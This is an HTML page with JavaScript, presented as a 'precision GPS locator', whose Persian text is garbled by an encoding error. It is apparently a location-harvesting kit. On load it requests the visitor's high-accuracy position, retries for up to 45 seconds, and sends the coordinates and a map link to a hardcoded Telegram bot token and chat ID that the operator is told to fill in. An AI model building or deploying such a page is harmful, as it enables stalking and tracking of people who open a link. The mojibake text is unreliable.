<!DOCTYPE html>
<html dir="rtl">
<head>
    <title>Ø±Ø¯ÛŒØ§Ø¨ Ø¯Ù‚ÛŒÙ‚ Ù¾ÛŒØ´Ø±ÙØªÙ‡</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 20px; }
        .status-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #2a5298;
        }
        .loading { color: #2a5298; font-weight: bold; }
        .success { color: #28a745; font-weight: bold; }
        .error { color: #dc3545; font-weight: bold; }
        .warning { color: #ff6b35; font-weight: bold; }
        .info {
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }
        .btn {
            background: #2a5298;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        .btn:hover { background: #1e3c72; }
        .accuracy-badge {
            display: inline-block;
            background: #e9ecef;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 14px;
            margin: 10px 0;
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #e9ecef;
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: #2a5298;
            width: 0%;
            transition: width 0.3s;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .timer {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        .gps-status {
            font-size: 13px;
            margin-top: 10px;
            padding: 8px;
            background: #f1f3f5;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ğŸ“ Ø³Ø§Ù…Ø§Ù†Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØªâ€ŒÛŒØ§Ø¨ ÙÙˆÙ‚â€ŒØ¯Ù‚ÛŒÙ‚</h2>
        
        <div class="status-box" id="statusBox">
            <p class="loading" id="statusMessage">Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ GPS Ùˆ Ø¬Ø³ØªØ¬ÙˆÛŒ Ù…Ø§Ù‡ÙˆØ§Ø±Ù‡â€ŒÙ‡Ø§...</p>
            <div class="progress-bar" id="progressBar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="timer" id="timer">Ø²Ù…Ø§Ù† Ø³Ù¾Ø±ÛŒ Ø´Ø¯Ù‡: 0 Ø«Ø§Ù†ÛŒÙ‡</div>
            <div id="accuracyContainer"></div>
            <div class="gps-status" id="gpsStatus">ğŸ“¡ ÙˆØ¶Ø¹ÛŒØª GPS: Ø¯Ø± Ø­Ø§Ù„ Ø¬Ø³ØªØ¬Ùˆ...</div>
        </div>
        
        <button class="btn" onclick="forceHighAccuracy()" id="retryBtn" style="display: none;">ØªÙ„Ø§Ø´ Ù…Ø¬Ø¯Ø¯ Ø¨Ø§ Ø¯Ù‚Øª Ø¨Ø§Ù„Ø§</button>
        <button class="btn" onclick="stopWatching()" id="stopBtn" style="display: none; background: #dc3545;">ØªÙˆÙ‚Ù Ø¬Ø³ØªØ¬Ùˆ</button>
        
        <p class="info">
            âš¡ Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø§ Ø¯Ù‚Øª Û´-Ûµ Ù…ØªØ±:<br>
            Û±. Ø­ØªÙ…Ø§Ù‹ GPS Ú¯ÙˆØ´ÛŒ ÙØ¹Ø§Ù„ Ø¨Ø§Ø´Ù‡<br>
            Û². Ø¯Ø± ÙØ¶Ø§ÛŒ Ø¨Ø§Ø² Ø¨Ø§Ø´ÛŒØ¯ Ùˆ Ø¢Ø³Ù…Ø§Ù† ÙˆØ§Ø¶Ø­ Ø¨Ø§Ø´Ø¯<br>
            Û³. Ø­Ø¯Ø§Ù‚Ù„ Û³Û° Ø«Ø§Ù†ÛŒÙ‡ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ØªØ§ GPS Ù‚ÙÙ„ Ø´ÙˆØ¯<br>
            Û´. Ø¨Ù‡ Ø¯Ú©Ù…Ù‡ "Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ" Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯
        </p>
    </div>

    <script>
    // ================================================
    // ğŸ”§ Ù…Ù‚Ø§Ø¯ÛŒØ± Ø®ÙˆØ¯Øª Ø±Ùˆ Ø§ÛŒÙ†Ø¬Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†
    // ================================================
    const BOT_TOKEN = "7576569023:AAGkMaUVtIUdR7-cgLlND3o66kcVH-jR6Lk";  // ØªÙˆÚ©Ù† Ø±Ø¨Ø§ØªØª Ø±Ùˆ Ø¨Ø°Ø§Ø±
    const CHAT_ID = "1653602559";                                 // Ú†Øª Ø¢ÛŒØ¯ÛŒ Ø®ÙˆØ¯Øª Ø±Ùˆ Ø¨Ø°Ø§Ø±
    // ================================================

    let retryCount = 0;
    const MAX_RETRIES = 3;
    let watchId = null;
    let startTime = null;
    let timerInterval = null;
    let bestAccuracy = Infinity;
    let bestPosition = null;

    // ØªØ§Ø¨Ø¹ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ØªØ§ÛŒÙ…Ø±
    function updateTimer() {
        if (!startTime) return;
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        document.getElementById('timer').textContent = `â± Ø²Ù…Ø§Ù† Ø³Ù¾Ø±ÛŒ Ø´Ø¯Ù‡: ${elapsed} Ø«Ø§Ù†ÛŒÙ‡`;
        
        // Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø± Ø§Ø³Ø§Ø³ Ø²Ù…Ø§Ù†
        if (elapsed > 30) {
            document.getElementById('gpsStatus').innerHTML = 'âš ï¸ GPS Ù‡Ù†ÙˆØ² Ø¯Ø± Ø­Ø§Ù„ Ø¬Ø³ØªØ¬Ùˆ Ø§Ø³ØªØŒ Ù…Ù…Ú©Ù† Ø§Ø³Øª Ø¯Ø± ÙØ¶Ø§ÛŒ Ø¨Ø§Ø² Ù†Ø¨Ø§Ø´ÛŒØ¯';
        } else if (elapsed > 15) {
            document.getElementById('gpsStatus').innerHTML = 'ğŸ”„ Ø¯Ø± Ø­Ø§Ù„ Ù‚ÙÙ„ Ú©Ø±Ø¯Ù† Ø±ÙˆÛŒ Ù…Ø§Ù‡ÙˆØ§Ø±Ù‡â€ŒÙ‡Ø§...';
        }
    }

    // ØªØ§Ø¨Ø¹ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ù¾ÛŒØ´Ø±ÙØª
    function updateProgress(accuracy) {
        let percentage = 0;
        if (accuracy < 10) percentage = 100;
        else if (accuracy < 50) percentage = 80;
        else if (accuracy < 100) percentage = 60;
        else if (accuracy < 500) percentage = 30;
        else percentage = 10;
        
        document.getElementById('progressFill').style.width = percentage + '%';
    }

    // ØªØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
    async function sendToTelegram(latitude, longitude, accuracy) {
        const message = `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø§ Ø¯Ù‚Øª Ø¨Ø§Ù„Ø§ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯!
â± Ø²Ù…Ø§Ù†: ${new Date().toLocaleString('fa-IR')}
ğŸŒ Ù…Ø®ØªØµØ§Øª: ${latitude}, ${longitude}
ğŸ¯ Ø¯Ù‚Øª: ${Math.round(accuracy)} Ù…ØªØ±
ğŸ“Š Ú©ÛŒÙÛŒØª: ${accuracy <= 10 ? 'âš¡ Ø¹Ø§Ù„ÛŒ (GPS Ø¯Ù‚ÛŒÙ‚)' : accuracy <= 30 ? 'ğŸŸ¢ Ø®ÙˆØ¨' : accuracy <= 50 ? 'ğŸŸ¡ Ù…ØªÙˆØ³Ø·' : 'ğŸ”´ Ø¶Ø¹ÛŒÙ'}
ğŸ—º Ù„ÛŒÙ†Ú© Ù†Ù‚Ø´Ù‡: https://www.google.com/maps?q=${latitude},${longitude}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            return result.ok;
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±ØªØ¨Ø§Ø· Ø¨Ø§ ØªÙ„Ú¯Ø±Ø§Ù…:', error);
            return false;
        }
    }

    // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø±Ø³ÛŒ Ùˆ Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø¯Ù‚Øª
    function isAccuracyAcceptable(accuracy) {
        return accuracy <= 30; // Ù‡Ø¯Ù Ø¯Ù‚Øª Ø²ÛŒØ± Û³Û° Ù…ØªØ± (GPS ÙˆØ§Ù‚Ø¹ÛŒ Ø²ÛŒØ± Û±Û° Ù…ØªØ±)
    }

    // ØªØ§Ø¨Ø¹ Ù…ÙˆÙÙ‚ÛŒØª - ÙˆÙ‚ØªÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ú¯Ø±ÙØªÙ‡ Ù…ÛŒØ´Ù‡
    function onLocationSuccess(position) {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const acc = position.coords.accuracy;
        
        // Ø°Ø®ÛŒØ±Ù‡ Ø¨Ù‡ØªØ±ÛŒÙ† Ø¯Ù‚Øª
        if (acc < bestAccuracy) {
            bestAccuracy = acc;
            bestPosition = position;
        }
        
        // Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ù¾ÛŒØ´Ø±ÙØª
        updateProgress(acc);
        
        // Ù†Ù…Ø§ÛŒØ´ Ø¯Ù‚Øª
        let accuracyClass = '';
        let accuracyText = '';
        let gpsMessage = '';
        
        if (acc <= 10) {
            accuracyClass = 'success';
            accuracyText = 'âš¡ Ø¹Ø§Ù„ÛŒ - GPS Ø¯Ù‚ÛŒÙ‚';
            gpsMessage = 'âœ… GPS Ø¨Ø§ Ú©ÛŒÙÛŒØª Ø¹Ø§Ù„ÛŒ Ù‚ÙÙ„ Ø´Ø¯Ù‡ Ø§Ø³Øª';
        } else if (acc <= 30) {
            accuracyClass = 'success';
            accuracyText = 'ğŸŸ¢ Ø®ÙˆØ¨ - Ù‚Ø§Ø¨Ù„ Ù‚Ø¨ÙˆÙ„';
            gpsMessage = 'âœ… GPS ÙØ¹Ø§Ù„ Ø§Ø³Øª';
        } else if (acc <= 50) {
            accuracyClass = 'warning';
            accuracyText = 'ğŸŸ¡ Ù…ØªÙˆØ³Ø· - ØªØ±Ú©ÛŒØ¨ÛŒ Ø§Ø² GPS Ùˆ ÙˆØ§ÛŒâ€ŒÙØ§ÛŒ';
            gpsMessage = 'âš ï¸ Ø¯Ù‚Øª Ú©Ù…ØªØ± Ø§Ø² Ø­Ø¯ Ù…Ø·Ù„ÙˆØ¨';
        } else if (acc <= 100) {
            accuracyClass = 'warning';
            accuracyText = 'ğŸŸ  Ø¶Ø¹ÛŒÙ - Ø§Ø­ØªÙ…Ø§Ù„Ø§Ù‹ ÙÙ‚Ø· ÙˆØ§ÛŒâ€ŒÙØ§ÛŒ';
            gpsMessage = 'âš ï¸ Ø¨Ù‡ ÙØ¶Ø§ÛŒ Ø¨Ø§Ø² Ø¨Ø±ÙˆÛŒØ¯';
        } else {
            accuracyClass = 'error';
            accuracyText = 'ğŸ”´ Ø®ÛŒÙ„ÛŒ Ø¶Ø¹ÛŒÙ - ÙÙ‚Ø· Ø¨Ø±Ø¬ Ù…Ø®Ø§Ø¨Ø±Ø§ØªÛŒ';
            gpsMessage = 'âŒ GPS Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª';
        }
        
        document.getElementById('accuracyContainer').innerHTML = `
            <div class="accuracy-badge">
                <span class="${accuracyClass}">${accuracyText}</span><br>
                Ø¯Ù‚Øª: <strong>${Math.round(acc)} Ù…ØªØ±</strong>
            </div>
        `;
        
        document.getElementById('gpsStatus').innerHTML = `ğŸ“¡ ${gpsMessage} (Ø¨Ù‡ØªØ±ÛŒÙ† Ø¯Ù‚Øª: ${Math.round(bestAccuracy)} Ù…ØªØ±)`;
        
        // Ø§Ú¯Ù‡ Ø¯Ù‚Øª Ø®ÙˆØ¨ Ø¨ÙˆØ¯ Ùˆ Ù‚Ø¨Ù„Ø§Ù‹ Ø§Ø±Ø³Ø§Ù„ Ù†Ú©Ø±Ø¯ÛŒÙ…ØŒ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†
        if (isAccuracyAcceptable(acc) && !window.sent) {
            window.sent = true;
            document.getElementById('statusMessage').className = 'success';
            document.getElementById('statusMessage').textContent = 'âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø§ Ø¯Ù‚Øª Ø®ÙˆØ¨ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...';
            
            // ØªÙˆÙ‚Ù Ø¬Ø³ØªØ¬Ùˆ
            stopWatching();
            
            sendToTelegram(lat, lng, acc).then(success => {
                if (success) {
                    document.getElementById('statusMessage').textContent = 'âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯!';
                    document.getElementById('statusBox').style.borderLeftColor = '#28a745';
                    
                    // Ù†Ù…Ø§ÛŒØ´ Ù„ÛŒÙ†Ú© Ù†Ù‚Ø´Ù‡
                    const mapLink = document.createElement('p');
                    mapLink.innerHTML = `<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color: #2a5298;">Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ø±ÙˆÛŒ Ù†Ù‚Ø´Ù‡</a>`;
                    document.getElementById('statusBox').appendChild(mapLink);
                } else {
                    document.getElementById('statusMessage').textContent = 'âš ï¸ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯ Ø§Ù…Ø§ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ù…Ø´Ú©Ù„ Ø¯Ø§Ø´Øª.';
                }
            });
        } else if (acc > 30) {
            // Ù‡Ù†ÙˆØ² Ø¨Ù‡ Ø¯Ù‚Øª Ù…Ø·Ù„ÙˆØ¨ Ù†Ø±Ø³ÛŒØ¯Ù‡ØŒ Ù¾ÛŒØ§Ù… Ø¨Ø¯Ù‡
            document.getElementById('statusMessage').className = 'loading';
            document.getElementById('statusMessage').textContent = `â³ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ù‡Ø¨ÙˆØ¯ Ø¯Ù‚Øª... (ÙØ¹Ù„ÛŒ: ${Math.round(acc)} Ù…ØªØ±)`;
        }
    }

    // ØªØ§Ø¨Ø¹ Ø®Ø·Ø§ - Ø§Ú¯Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ú¯Ø±ÙØªÙ‡ Ù†Ø´Ù‡
    function onLocationError(error) {
        let message = '';
        let suggestion = '';
        
        switch(error.code) {
            case error.PERMISSION_DENIED:
                message = 'âŒ Ø´Ù…Ø§ Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø§ Ø±Ø¯ Ú©Ø±Ø¯ÛŒØ¯.';
                suggestion = 'Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ØŒ Ù„Ø·ÙØ§Ù‹ Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ø®ÙˆØ¯ Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø§ ØµØ§Ø¯Ø± Ú©Ù†ÛŒØ¯.';
                break;
            case error.POSITION_UNAVAILABLE:
                message = 'âŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª.';
                suggestion = 'Ù„Ø·ÙØ§Ù‹ Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ GPS Ú¯ÙˆØ´ÛŒ Ø´Ù…Ø§ ÙØ¹Ø§Ù„ Ø§Ø³Øª Ùˆ Ø¯Ø± ÙØ¶Ø§ÛŒ Ø¨Ø§Ø² Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±ÛŒØ¯.';
                break;
            case error.TIMEOUT:
                message = 'âŒ Ø²Ù…Ø§Ù† Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯.';
                suggestion = 'Ù…Ù…Ú©Ù† Ø§Ø³Øª GPS Ø¯Ø± Ø­Ø§Ù„ Ø¬Ø³ØªØ¬Ùˆ Ø¨Ø§Ø´Ø¯. Ú†Ù†Ø¯ Ù„Ø­Ø¸Ù‡ Ø¯ÛŒÚ¯Ø± ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯.';
                break;
            default:
                message = 'âŒ Ø®Ø·Ø§ÛŒ Ù†Ø§Ø´Ù†Ø§Ø®ØªÙ‡ Ø±Ø® Ø¯Ø§Ø¯.';
        }
        
        document.getElementById('statusMessage').className = 'error';
        document.getElementById('statusMessage').textContent = message;
        document.getElementById('accuracyContainer').innerHTML = `<p class="error">${suggestion}</p>`;
        document.getElementById('retryBtn').style.display = 'inline-block';
        document.getElementById('stopBtn').style.display = 'none';
        document.getElementById('statusBox').style.borderLeftColor = '#dc3545';
        
        stopWatching();
    }

    // ØªÙˆÙ‚Ù Ø¬Ø³ØªØ¬Ùˆ
    function stopWatching() {
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
        }
        if (timerInterval) {
            clearInterval(timerInterval);
            timerInterval = null;
        }
        document.getElementById('stopBtn').style.display = 'none';
    }

    // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø§ Ø¯Ù‚Øª Ø¨Ø§Ù„Ø§
    function forceHighAccuracy() {
        if (!navigator.geolocation) {
            document.getElementById('statusMessage').className = 'error';
            document.getElementById('statusMessage').textContent = 'âŒ Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² Ù…ÙˆÙ‚Ø¹ÛŒØªâ€ŒÛŒØ§Ø¨ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.';
            return;
        }
        
        // ØªÙ†Ø¸ÛŒÙ… Ù…Ø¬Ø¯Ø¯ ÙˆØ¶Ø¹ÛŒØª
        window.sent = false;
        bestAccuracy = Infinity;
        bestPosition = null;
        startTime = Date.now();
        
        document.getElementById('statusMessage').className = 'loading';
        document.getElementById('statusMessage').textContent = 'Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ GPS Ùˆ Ø¬Ø³ØªØ¬ÙˆÛŒ Ù…Ø§Ù‡ÙˆØ§Ø±Ù‡â€ŒÙ‡Ø§...';
        document.getElementById('retryBtn').style.display = 'none';
        document.getElementById('stopBtn').style.display = 'inline-block';
        document.getElementById('accuracyContainer').innerHTML = '';
        document.getElementById('statusBox').style.borderLeftColor = '#2a5298';
        document.getElementById('progressFill').style.width = '10%';
        document.getElementById('gpsStatus').innerHTML = 'ğŸ“¡ ÙˆØ¶Ø¹ÛŒØª GPS: Ø¯Ø± Ø­Ø§Ù„ Ø¬Ø³ØªØ¬Ùˆ...';
        
        // Ø´Ø±ÙˆØ¹ ØªØ§ÛŒÙ…Ø±
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(updateTimer, 1000);
        
        // â­ Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ø¨Ù‡ÛŒÙ†Ù‡ Ø¨Ø±Ø§ÛŒ GPS ÙˆØ§Ù‚Ø¹ÛŒ
        const options = {
            enableHighAccuracy: true,      // Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¨Ø±Ø§ÛŒ GPS
            timeout: 30000,                 // Û³Û° Ø«Ø§Ù†ÛŒÙ‡ ØµØ¨Ø± Ú©Ù†
            maximumAge: 0                    // Ù‡ÛŒÚ†ÙˆÙ‚Øª Ø§Ø² Ø­Ø§ÙØ¸Ù‡ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù†Ú©Ù†
        };
        
        //å…ˆç”¨ getCurrentPosition Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†
        navigator.geolocation.getCurrentPosition(
            onLocationSuccess, 
            onLocationError, 
            options
        );
        
        // Ø¨Ø¹Ø¯ Ø§Ø² Ûµ Ø«Ø§Ù†ÛŒÙ‡ØŒ watchPosition Ø±Ùˆ Ù‡Ù… Ø´Ø±ÙˆØ¹ Ú©Ù† Ø¨Ø±Ø§ÛŒ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ù…Ø¯Ø§ÙˆÙ…
        setTimeout(() => {
            if (!window.sent) {
                watchId = navigator.geolocation.watchPosition(
                    onLocationSuccess, 
                    onLocationError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 30000,
                        maximumAge: 0
                    }
                );
            }
        }, 5000);
        
        // Ø¨Ø¹Ø¯ Ø§Ø² Û´Ûµ Ø«Ø§Ù†ÛŒÙ‡ØŒ Ø§Ú¯Ù‡ Ø¯Ù‚Øª Ø®ÙˆØ¨ Ù†Ø´Ø¯ØŒ Ø¨Ù‡ØªØ±ÛŒÙ† Ø¯Ù‚Øª Ø±Ùˆ Ø¨ÙØ±Ø³Øª
        setTimeout(() => {
            if (!window.sent && bestPosition) {
                const lat = bestPosition.coords.latitude;
                const lng = bestPosition.coords.longitude;
                const acc = bestPosition.coords.accuracy;
                
                window.sent = true;
                document.getElementById('statusMessage').className = 'warning';
                document.getElementById('statusMessage').textContent = 'â± Ø²Ù…Ø§Ù† Ù…Ø­Ø¯ÙˆØ¯ Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯. Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ØªØ±ÛŒÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª...';
                
                stopWatching();
                
                sendToTelegram(lat, lng, acc).then(success => {
                    if (success) {
                        document.getElementById('statusMessage').textContent = 'âœ… Ø¨Ù‡ØªØ±ÛŒÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…ÙˆØ¬ÙˆØ¯ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯!';
                    }
                });
            } else if (!window.sent && !bestPosition) {
                document.getElementById('statusMessage').className = 'warning';
                document.getElementById('statusMessage').textContent = 'â± Ø²Ù…Ø§Ù† Ù…Ø­Ø¯ÙˆØ¯ Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯ØŒ ÙˆÙ„ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØªÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯.';
                document.getElementById('retryBtn').style.display = 'inline-block';
                document.getElementById('stopBtn').style.display = 'none';
            }
        }, 45000);
    }

    // Ø´Ø±ÙˆØ¹ Ø®ÙˆØ¯Ú©Ø§Ø± Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø² Ø´Ø¯Ù† ØµÙØ­Ù‡
    window.onload = function() {
        forceHighAccuracy();
    };
    </script>
</body>
</html>